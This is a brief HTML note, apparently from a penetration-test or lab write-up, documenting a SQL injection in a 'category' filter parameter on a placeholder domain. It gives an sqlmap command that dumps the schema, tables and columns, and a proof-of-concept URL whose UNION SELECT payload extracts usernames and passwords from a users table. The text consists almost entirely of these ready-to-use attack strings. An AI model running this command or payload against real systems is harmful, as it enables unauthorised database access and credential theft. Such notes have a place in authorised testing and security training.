<h1>SQL Injection</h1>

<h2>Reflected SQL Injection:</h2>
<code>sqlmap --url https://$domain/filter?category=Lifestyle --dump --schema --tables --columns</code>

<p>Database: public</p>
<p>Table: users</p>

<h4>POC</h4>
<code>https://$domain/filter?category=Lifestyle'+UNION+SELECT+username,+password+FROM+users--</code>
